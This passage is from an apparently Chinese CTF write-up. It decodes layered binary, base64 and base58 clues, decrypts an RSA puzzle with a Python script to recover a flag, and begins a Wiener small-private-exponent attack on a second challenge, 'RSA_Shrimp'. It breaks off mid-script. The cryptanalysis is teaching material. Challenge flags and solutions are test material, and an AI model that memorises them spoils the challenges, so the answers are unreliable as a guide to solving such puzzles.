01100101 01101110 00100000 01101001 01101110 00100000 01110100 01101000 01100101 00100000 01110011 01101000 01100001 01100100 01100101 00101110 00001010 00001010 01010110 01000111 01101000 01101100 01001001 01000111 01011010 01110011 01011001 01010111 01100011 01100111 01100001 01011000 01001101 01100111 01010111 01101011 01000110 01000100 01010110 01000101 01011010 00110111 01001101 01010110 00111001 01101010 01001101 01001000 01010110 01110011 01011010 01000110 00111001 01101111 01010001 01001000 01011001 01111010 01011000 00110010 01001001 01110111 01100011 01101101 00110101 01101100 01011000 00110011 01010010 01101111 01001101 00110001 00111001 01010100 01100001 01000101 01000010 01101011 01001101 00110001 00111000 01110111 01011010 01101100 00111001 01110100 01010001 01000100 01100100 01101111 01100110 01010100 01010101 00110100 01001001 01010011 01000010 01001011 01100100 01011000 01001110 00110000 01001001 01000111 01000101 01100111 01100010 01000111 01101100 00110000 01100100 01000111 01111000 01101100 01001001 01000111 01110000 01110110 01100001 00110010 01010101 01110011 01001001 01000101 00110001 00110011 01011001 01010111 01101000 01101000 01100001 01000111 01000101 01101000 01001001 01010011 01000010 01011010 01100010 00110011 01010101 01100111 01100010 01010111 01101100 01101110 01100001 01001000 01010001 01100111 01100010 01101101 00111001 00110000 01100001 01010111 01001110 01101100 01001001 01001000 01010010 01101111 01011001 01011000 01010001 01100111 01100100 01000111 01101000 01101100 01001001 01000111 01011010 01110011 01011001 01010111 01100011 01100111 01011001 00110010 00111001 01110100 01011010 01011000 01001101 01100111 01011010 01101110 01001010 01110110 01100010 01010011 01000010 01101000 01001001 01001000 01000010 01110110 01011010 01010111 00110000 01100111 01011001 01101110 01101011 01100111 01010010 01000111 01101100 01101010 01100001 00110010 01101100 01110101 01100011 00110010 00111001 01110101 01001100 01000011 01000001 01101001 01010011 01000111 01000110 01101011 01001001 01000101 01101011 01100111 01100010 01101101 00111001 00110000 01001001 01001000 01001110 01101100 01011010 01010111 00110100 01100111 01100100 01000111 01101000 01101100 01001001 01001000 01001110 00110001 01100010 01101001 00110100 01101001 01001001 01000110 01010010 01101111 01011010 01010011 01000010 01110101 01011010 01011000 01101000 00110000 01001001 01000111 01111000 01110000 01100010 01101101 01010110 01111010 01001001 01000111 01100100 01110110 01001111 01101001 01000001 01101001 01010001 01101110 01010110 00110000 01001001 01000101 01111000 01110000 01011010 00110010 01101000 00110000 01001001 01000111 01000101 01100111 01100010 01101101 01010110 00110011 01011010 01011000 01001001 01100111 01010110 00110010 01101100 01110011 01011010 01000111 01010110 01111001 01100010 01101101 01010110 01111010 01100011 01111001 01110111 01100111 01010100 01011000 01101011 01100111 01010110 00110010 01101100 01110011 01011010 01000111 01010110 01111001 01100010 01101101 01010110 01111010 01100011 01111001 01000010 01101111 01011001 01011000 01001101 01100111 01100010 01010111 01000110 01101011 01011010 01010011 00110100 01101001 01001001 01000101 01101110 01101001 01100111 01001010 01101100 00110010 01011010 01010011 01000010 01110100 01011001 01010111 01010010 01101100 01001001 01000111 01000101 01100111 01100011 00110010 01111000 01110000 01011010 00110010 01101000 00110000 01001001 01000111 01000110 01110011 01100100 01000111 01010110 01111001 01011001 01011000 01010010 01110000 01100010 00110010 00110100 01100111 01100100 01000111 00111000 01100111 01100100 01000111 01101000 01101100 01001001 01000111 01111000 01110000 01100010 01101101 01010110 01111010 01001100 01000011 01000010 01110001 01100100 01011000 01001110 00110000 01001001 01001000 01010010 01110110 01001001 01000111 01001110 01110110 01100010 01101101 01011010 00110001 01100011 00110010 01010101 01100111 01100101 01010111 00111001 00110001 01100011 01101001 01000010 01101100 01100101 01010111 01010110 01111010 01001100 01101001 01000010 01010001 01011010 01011000 01001010 01101111 01011001 01011000 01000010 01111010 01001001 01001000 01010010 01101111 01100001 01011000 01001101 01100111 01100100 00110010 01101100 01110011 01100010 01000011 01000010 01101111 01011010 01010111 01111000 01110111 01001001 01001000 01101100 01110110 01100100 01010011 01000010 01101110 01100100 01010111 01010110 01111010 01100011 01111001 01000010 00110000 01100001 01000111 01010101 01100111 01100100 01001000 01001010 00110001 01011010 01010011 01000010 01101101 01100010 01000111 01000110 01101110 01010000 01111001 01000010 01000011 01100100 01011000 01010001 01100111 01100001 01010111 01011001 01100111 01100101 01010111 00111001 00110001 00110100 01101111 01000011 01011010 01100011 01101101 01010101 01100111 01100100 01011000 01000001 01100111 01011010 01101101 00111001 01111001 01001001 01000111 01000101 01100111 01011001 00110010 01101000 01101000 01100010 01000111 01111000 01101100 01100010 01101101 01100100 01101100 01001100 01000011 01000010 01110100 01011001 01011000 01101100 01101001 01011010 01010011 01000010 00110101 01100010 00110011 01010101 01100111 01100011 00110010 01101000 01110110 01100100 01010111 01111000 01101011 01001001 01000111 01111000 01110110 01100010 00110010 01110011 01100111 01011001 01101101 01000110 01101010 01100001 01111001 01000010 01101010 01011001 01011000 01001010 01101100 01011010 01101110 01010110 01110011 01100010 01001000 01101011 01100111 01011001 01010111 00110101 01101011 01001001 01001000 01001110 01101100 01011010 01010011 01000010 01110000 01011010 01101001 01000010 00110000 01100001 01000111 01010110 01111001 01011010 01010011 01100100 01111010 01001001 01000111 01000101 01100111 01100001 01000111 01101100 01101011 01011010 01000111 01010110 01110101 01001001 01000101 01001010 01101000 01100011 00110010 01010101 01100111 01011010 01000111 01010110 01101010 01100011 01101110 01101100 01110111 01100100 01000111 01101100 01110110 01100010 01101001 00110100 01100111 01010110 01000111 01101000 01101100 01100011 01101101 01011000 01101001 01100111 01001010 01101100 01111010 01001001 01000111 00110001 01110110 01100011 01101101 01010101 01100111 01100100 01000111 00111000 01100111 01011010 01000111 01101100 01111010 01011001 00110010 00111001 00110010 01011010 01011000 01001001 01100111 01100001 01010111 00110100 01100111 01100100 01000111 01101000 01101100 01001001 01000111 00110101 00110001 01100010 01010111 01001010 01101100 01100011 01101110 01001101 01100111 01011001 01010111 00110101 01101011 01001001 01000111 01111000 01101100 01100100 01001000 01010010 01101100 01100011 01101110 01001101 01110011 01001001 01001000 01001110 01101100 01011001 00110011 01001010 01101100 01100100 01001000 01001101 01100111 01100100 00110010 01000110 01110000 01100100 01000111 01101100 01110101 01011010 01111001 01000010 00110000 01100010 01111001 01000010 01101001 01011010 01010011 01000010 00110001 01100010 01101110 01011010 01101100 01100001 01010111 01111000 01101100 01011010 01000011 00110100 00111101 00001010 00001010 00110010 00110110 01000110 01101010 01110100 01101111 01111010 01110011 01011010 00110111 01010010 00110010 01000101 01010001 01000001 01110111 01010101 01010010 01000111 01011000 01110100 01110001 01011010 01000100 01101110 01100011 01100101 00110111 01011000 01010111 00110100 00110111 00110101 00110111 00110001 01101001 01100011 01010100 01010010 01010001 01001110 01011000 01110000 01101011 01010011 01010110 01101110 01110100 01001101 01101000 00111000 01000011 01101010 01101011 00110101 01110000 01110000 01001000 01000010 01010100 01100101 01001100 01000110 01100111 00110001 01001100 01010001 01101001 01010111 01110100 00111001 01011010 01010000 01110000 01010000 01110100 01101011 01010100 01110001 00111000 01100100 01110000 01110100 01001110 01111000 01100100 00110010 01011001 01010001 01100101 00110110 01011001 00110101 01100001 00110101 01101011 01010000 00111000 01110001 01010111 01010001 01100110 01001100 00111000 01000111 01010001 01001010 01010100 01101101 01101001 01110100 01010100 01000101 01111001 01101010 01100011 01110010 00110010 01100011 01000001 01110010 00110110 01001000 01010101 01111001 01001000 01010111 01110110 01111010 01000011 01101010 01100011 00111000 01100010 01001101 01100110 00111000 01100010 01111001 01100110 01101110 01010000 00110010 00110001 01101111 01100111 01010001 01111001 01010101 00110001 01010001 01000010 01110110 00110010 01001000 01000101 00110010 01010100 00111001 01010011 00110101 01101011 01110001 01100110 01011010 01101011 01101010 01101010 01001110 01000100 01001101 01100001 01011001 01000010 01010011 00110110 01010111 01001010 01010001 01100101 01000111 01100111 01000110 00110100 01110010 00111000 01010010 00110011 01011000 00110111 01100010 01001110 00110111 01100100 01001000 01100111 01011010 01001101 01000111 01000001 00110100 01100100 01101101 00110111 01100101 01010000 01110101 00111000 01110001 01100010 00110111 00111000 01001101 01000101 00111001 01101001 01000011 01100100 01110011 01100010 01110011 01101010 00111001 01100011 01110111 01100101 00110111 01101000 00110001 01001000 01011001 01000001 01011010 00110110 00110011 01001000 01111001 01001101 01110111 01111010 01010101 01100010 01110100 01000001 01010101 00111001 01100100 01100101 01010110 01010010 01111010 01000111 01110111 01101001 01110101 01010110 01000011 00111000 01011010 01110111 01000101 01101010 01101010 01100101 01110001 01010100 01101000 00111001 01000100 01101101 01000111 01110100 01010111 01110101 01101110 01101000 01001011 00111000 01110001 01010101 00110100 01101010 01000111 00110111 01101000 01100100 01011010 01001000 01100011 01010000 01110101 01000010 01110001 01001010 00110011 01110001 01101001 01000100 01000011 00111001 01100010 00110011 01110010 00110110 01101010 01111001 01101110 01001110 01001011 01101000 00110111 01000011 01111000 01001000 01100111 01010001 01011010 00110100 01001010 01010100 01100110 01011010 01010101 00110101 01000101 01101001 00110111 01110010 01011000 01101010 01001010 01110010 01010001 01101111 00111000 01100110 01001000 01010011 01010001 01100100 01000001 01101110 01010010 01001000 01110101 01110111 01000001 00111000 01010110 01100100 01011001 01001010 01101010 01011000 01000010 01010000 01100110 01101101 01110100 00110100 01100011 01010101 01111010 01010010 01110100 01010100 01110100 01001101 01001101 01100110 01001110 01100011 01010111 01110000 01110011 01010100 00110110 01101110 01010101 00110101 01111010 01110011 01101011 01011000 01101010 01010000 01010110 01110101 01000101 01010101 01101001 01000110 01110000 01010101 00110101 01001101 01111000 01000101 01000001 01010110 01101001 01111000 00110101 01001100 01000010 01110011 01100011 00110111 01011000 01110000 01010000 01010100 01101001 01110100 01010101 01001101 01100100 01110101 01100101 00110100 01011010 00110101 01010001 00110011 01010101 01100100 01010111 01011001 00110100 01001100 01010101 01100010 01110000 01000101 01001100 01100110 01111010 01100110 00111001 01001000 01000110 00110101 01000110 01110000 01010000 01110111 01100011 01000100 01100100 01000101 01010001 01110011 01001010 01110011 01101000 01111001 00110110 00111001 01010010 01110111 01110101 01010011 01010000 01111000 01111001 01001110 01111000 01000111 01011001 01100101 01110110 01110100 00110110 01101010 01110011 01111010 01100111 00110100 01110001 01010001 01000011 01010011 01000010 01011000 01100011 01010101 01000100 01001000 01110010 00110100 01101000 01101010 01100001 00110011 01011000 01010110 01111010 01000110 01001100 01100010 01000011 01110100 01110001 01101110 01011000 01111000 00111000 01110010 01110011 01001110 01101000 01101101 01000100 01100011 01110101 01101011 01011000 01001110 00110001 01110000 01101011 01000101 01000110 01000111 01010011 01010001 01111000 01110010 01010101 01000011 01100101 00110100 00110111 01010100 01100010 00110111 01010011 01101001 01011010 00110100 01001101 01001000 00111000 01100100 01101111 01001010 01010011 01000111 01001110 01000011 01011001 01100110 01110010 01110100 00110100 01001110 01110011 01101110 01110111 01100101 01100011 01100100 01100101 01010000 01110010 01001101 01110001 01100011 01100100 00110110 01010100 01111001 01010100 01001011 01110001 01110101 00110010 00110011 01010001 01010111 01001000 01101001 01010000 01110000 01010111 01100010 01110100 01110011 00110101 01001000 01010011 00111000 01100100 01101011 00110110 01100100 00110101 01111010 00110011 01100001 01001110 01111001 01001011 01100111 01111001 01100010 01110001 00110011 00110001 01010010 01101001 01111010 01011001 01111001 01001010 00110110 01000001 00110110 01101010 01000011 01100110 00110010 01000100 01101101 01001011 01010001 01111010 01001010 01000110 01110001 00110010 01111000 01101110 01010010 01100111 01100001 01101011 01000110 01110010 01100010 00110111 01101101 01110101 00110011 01100001 00110111 00111000 01001100 00110100 01110001 01100101 01110001 01101101 01110111 00111000 01010111 01001010 01100111 01110110 01010100 01100101 01111001 01101010 01101001 01001110 01100011 01100101 01000111 00110100 01001011 01101000 01001110 01101011 01110011 01101101 01100101 00110011 01010100 01010001 01110010 01000100 00110001 01011000 00110110 01110000 01101001 01010110 01101000 01010110 01110001 01110110 01010010 01001010 01000011 01000100 00110010 01110111 01110011 00110001 00111001 01111001 01000111 01001110 01001100 01000100 01010111 01001110 01110100 01010000 01010100 01110011 01101101 01111010 01001101 01010001 01010000 01010100 01100011 01110101 01001011 00111001 00110011 01000101 01010101 00110010 01000010 01110101 01110111 01100100 01110000 01111010 01100010 01001101 01000001</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="comment"># 从命令行读取所有参数，合并成一个字符串</span></span><br><span class="line">binary_text = <span class="string">&#x27; &#x27;</span>.join(sys.argv[<span class="number">1</span>:])</span><br><span class="line"></span><br><span class="line"><span class="comment"># 转换：将每个二进制字节转换为ASCII字符</span></span><br><span class="line"><span class="keyword">for</span> binary_byte <span class="keyword">in</span> binary_text.split():</span><br><span class="line">    <span class="keyword">if</span> binary_byte:  <span class="comment"># 跳过空字符串</span></span><br><span class="line">        <span class="comment"># 二进制转十进制，再转字符</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">chr</span>(<span class="built_in">int</span>(binary_byte, <span class="number">2</span>)), end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>()  <span class="comment"># 最后换行</span></span><br></pre></td></tr></table></figure>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">The time has come to make a choice. Choose wisely, or you risk letting your heart become a newer wilderness, and the true flag may remain hidden in the shade.</span><br><span class="line"></span><br><span class="line">VGhlIGZsYWcgaXMgWkFDVEZ7MV9jMHVsZF9oQHYzX2Iwcm5lX3RoM19TaEBkM18wZl9tQDdofTU4ISBKdXN0IGEgbGl0dGxlIGpva2UsIE13YWhhaGEhISBZb3UgbWlnaHQgbm90aWNlIHRoYXQgdGhlIGZsYWcgY29tZXMgZnJvbSBhIHBvZW0gYnkgRGlja2luc29uLCAiSGFkIEkgbm90IHNlZW4gdGhlIHN1bi4iIFRoZSBuZXh0IGxpbmVzIGdvOiAiQnV0IExpZ2h0IGEgbmV3ZXIgV2lsZGVybmVzcywgTXkgV2lsZGVybmVzcyBoYXMgbWFkZS4iIEnigJl2ZSBtYWRlIGEgc2xpZ2h0IGFsdGVyYXRpb24gdG8gdGhlIGxpbmVzLCBqdXN0IHRvIGNvbmZ1c2UgeW91ciBleWVzLiBQZXJoYXBzIHRoaXMgd2lsbCBoZWxwIHlvdSBndWVzcyB0aGUgdHJ1ZSBmbGFnPyBCdXQgaWYgeW914oCZcmUgdXAgZm9yIGEgY2hhbGxlbmdlLCBtYXliZSB5b3Ugc2hvdWxkIGxvb2sgYmFjayBjYXJlZnVsbHkgYW5kIHNlZSBpZiB0aGVyZSdzIGEgaGlkZGVuIEJhc2UgZGVjcnlwdGlvbi4gVGhlcmXigJlzIG1vcmUgdG8gZGlzY292ZXIgaW4gdGhlIG51bWJlcnMgYW5kIGxldHRlcnMsIHNlY3JldHMgd2FpdGluZyB0byBiZSB1bnZlaWxlZC4=</span><br><span class="line"></span><br><span class="line">26FjtozsZ7R2EQAwURGXtqZDnce7XW47571icTRQNXpkSVntMh8Cjk5ppHBTeLFg1LQiWt9ZPpPtkTq8dptNxd2YQe6Y5a5kP8qWQfL8GQJTmitTEyjcr2cAr6HUyHWvzCjc8bMf8byfnP21ogQyU1QBv2HE2T9S5kqfZkjjNDMaYBS6WJQeGgF4r8R3X7bN7dHgZMGA4dm7ePu8qb78ME9iCdsbsj9cwe7h1HYAZ63HyMwzUbtAU9deVRzGwiuVC8ZwEjjeqTh9DmGtWunhK8qU4jG7hdZHcPuBqJ3qiDC9b3r6jynNKh7CxHgQZ4JTfZU5Ei7rXjJrQo8fHSQdAnRHuwA8VdYJjXBPfmt4cUzRtTtMMfNcWpsT6nU5zskXjPVuEUiFpU5MxEAVix5LBsc7XpPTitUMdue4Z5Q3UdWY4LUbpELfzf9HF5FpPwcDdEQsJshy69RwuSPxyNxGYevt6jszg4qQCSBXcUDHr4hja3XVzFLbCtqnXx8rsNhmDcukXN1pkEFGSQxrUCe47Tb7SiZ4MH8doJSGNCYfrt4NsnwecdePrMqcd6TyTKqu23QWHiPpWbts5HS8dk6d5z3aNyKgybq31RizYyJ6A6jCf2DmKQzJFq2xnRgakFrb7mu3a78L4qeqmw8WJgvTeyjiNceG4KhNksme3TQrD1X6piVhVqvRJCD2ws19yGNLDWNtPTsmzMQPTcuK93EU2BuwdpzbMA</span><br></pre></td></tr></table></figure>
<p>第一段是fake：</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">The flag is ZACTF&#123;1_c0uld_h@v3_b0rne_th3_Sh@d3_0f_m@7h&#125;58! Just a little joke, Mwahaha!! You might notice that the flag comes from a poem by Dickinson, &quot;Had I not seen the sun.&quot; The next lines go: &quot;But Light a newer Wilderness, My Wilderness has made.&quot; Iâve made a slight alteration to the lines, just to confuse your eyes. Perhaps this will help you guess the true flag? But if youâre up for a challenge, maybe you should look back carefully and see if there&#x27;s a hidden Base decryption. Thereâs more to discover in the numbers and letters, secrets waiting to be unveiled.</span><br></pre></td></tr></table></figure>
<p>第二段base64解码失败，怀疑是base58:</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">A little RSA riddle awaits you. Crack the code, unveil the secret, and you&#x27;ll discover the first line of the twisted, cryptic version of the Dickinson poem I just shared â leading you to the true flag.</span><br><span class="line"></span><br><span class="line">p = 79366393717289094339549910346342915738036801147892841609988538737083315828633</span><br><span class="line">q = 89541276936773591836074173019098253300353308346744434955546251733216891032729</span><br><span class="line">e = 65537</span><br><span class="line">c = 3053910251720456011590806565004747266601634289537034519459823030624390475991109095903273093242658152291715128422599392416400743433708929803291354900903421</span><br></pre></td></tr></table></figure>
<p>解密即可</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># RSA parameters</span></span><br><span class="line">p = <span class="number">79366393717289094339549910346342915738036801147892841609988538737083315828633</span></span><br><span class="line">q = <span class="number">89541276936773591836074173019098253300353308346744434955546251733216891032729</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">c = <span class="number">3053910251720456011590806565004747266601634289537034519459823030624390475991109095903273093242658152291715128422599392416400743433708929803291354900903421</span></span><br><span class="line"></span><br><span class="line">n = p * q</span><br><span class="line">phi_n = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">egcd</span>(<span class="params">a, b</span>):</span><br><span class="line">    <span class="keyword">if</span> a == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> (b, <span class="number">0</span>, <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        g, y, x = egcd(b % a, a)</span><br><span class="line">        <span class="keyword">return</span> (g, x - (b // a) * y, y)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">modinv</span>(<span class="params">a, m</span>):</span><br><span class="line">    g, x, y = egcd(a, m)</span><br><span class="line">    <span class="keyword">if</span> g != <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">raise</span> Exception(<span class="string">&#x27;modular inverse does not exist&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> x % m</span><br><span class="line"></span><br><span class="line">d = modinv(e, phi_n)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Decrypt ciphertext</span></span><br><span class="line">m = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;Decrypted message (as integer) = <span class="subst">&#123;m&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Convert integer to bytes/ASCII</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">int_to_bytes</span>(<span class="params">m_int</span>):</span><br><span class="line">    <span class="comment"># Convert to hex, then to bytes</span></span><br><span class="line">    hex_str = <span class="built_in">hex</span>(m_int)[<span class="number">2</span>:]  <span class="comment"># Remove &#x27;0x&#x27; prefix</span></span><br><span class="line">    <span class="comment"># Ensure even length</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(hex_str) % <span class="number">2</span> != <span class="number">0</span>:</span><br><span class="line">        hex_str = <span class="string">&#x27;0&#x27;</span> + hex_str</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>.fromhex(hex_str)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Try to decode as ASCII</span></span><br><span class="line">msg_bytes = int_to_bytes(m)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;Message in bytes: <span class="subst">&#123;msg_bytes&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;Message as string: <span class="subst">&#123;msg_bytes.decode(<span class="string">&#x27;ascii&#x27;</span>, errors=<span class="string">&#x27;ignore&#x27;</span>)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="comment"># Check if the bytes themselves are hex chars</span></span><br><span class="line">    possible_hex = msg_bytes.decode(<span class="string">&#x27;ascii&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">all</span>(c <span class="keyword">in</span> <span class="string">&#x27;0123456789abcdefABCDEF&#x27;</span> <span class="keyword">for</span> c <span class="keyword">in</span> possible_hex):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Possible hex string: <span class="subst">&#123;possible_hex&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="comment"># Try decoding from hex</span></span><br><span class="line">        from_hex = <span class="built_in">bytes</span>.fromhex(possible_hex)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;From hex decode: <span class="subst">&#123;from_hex&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;As string: <span class="subst">&#123;from_hex.decode(<span class="string">&#x27;ascii&#x27;</span>, errors=<span class="string">&#x27;ignore&#x27;</span>)&#125;</span>&quot;</span>)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Try common encodings</span></span><br><span class="line"><span class="keyword">for</span> enc <span class="keyword">in</span> [<span class="string">&#x27;utf-8&#x27;</span>, <span class="string">&#x27;latin-1&#x27;</span>]:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Trying <span class="subst">&#123;enc&#125;</span>: <span class="subst">&#123;msg_bytes.decode(enc)&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br></pre></td></tr></table></figure>
<p>得到<strong>CBCTF{H@d_1_n0t_s33n_th3_L1ght_0f_CryP7o}</strong></p>
<ul>
<li>RSA_Shrimp</li>
</ul>
<blockquote>
<p>We intercepted an RSA-encrypted message, but it seems the sender made a critical mistake when generating the keys: the private exponent d is unusually small?</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">flag = <span class="string">b&quot;*********************&quot;</span></span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line"></span><br><span class="line">p = getPrime(<span class="number">512</span>)</span><br><span class="line">q = getPrime(<span class="number">512</span>)   </span><br><span class="line">N = p * q</span><br><span class="line">phi = (p-<span class="number">1</span>) * (q-<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    d = getRandomNBitInteger(<span class="number">100</span>)</span><br><span class="line">    <span class="keyword">if</span> GCD(d, phi) == <span class="number">1</span>:</span><br><span class="line">        e = inverse(d, phi)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">c = <span class="built_in">pow</span>(m, e, N)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;N =&quot;</span>, N)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;e =&quot;</span>, e)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;c =&quot;</span>, c)</span><br><span class="line"></span><br><span class="line"><span class="comment"># N = 83810405458629670011268195175607930776502851270019593430778113462991227653979843489021103300987730272108652551286407869238663428126312534610419471430932571715602570165775301827764412220731982754705007707697187820099680332795505670948540843105573754933647288435625741245436238428836440202278683287801421360077</span></span><br><span class="line"><span class="comment"># e = 44325518006091876721605823409610042252069625967882044704024214032751966871521847773994263894312607474509588371872161541972144207214032339247431102110456229841266040285615770275478438280620725262108096170791001509463685129909286120575052133129389839912877047603238192564639423047082080059345481052412519925381</span></span><br><span class="line"><span class="comment"># c = 73434158249386043625252431253323506682208843849831594508828737831830362719932115747428792429497868946601098023909629141071257910108747977030342842534107828613672478901354339083057876376985055292417284326608488912346944387146680464066055117328325698648200021918802428101944953998434164564886207047699320456022</span></span><br></pre></td></tr></table></figure>
<script type="math/tex; mode=display">
\begin{gather}
e·d-k\phi(n)=1 \\
e/\phi(n)-k/d=1/d\phi(n) \\
e/\phi(n)-k/d≈1/dn \\
\end{gather}</script><p><img src="/iamges/QianJianTec1766498811775.png" alt=""></p>
<p>尝试<strong>Wiener 攻击</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"></span><br><span class="line">N = <span class="number">83810405458629670011268195175607930776502851270019593430778113462991227653979843489021103300987730272108652551286407869238663428126312534610419471430932571715602570165775301827764412220731982754705007707697187820099680332795505670948540843105573754933647288435625741245436238428836440202278683287801421360077</span></span><br><span class="line">e = <span 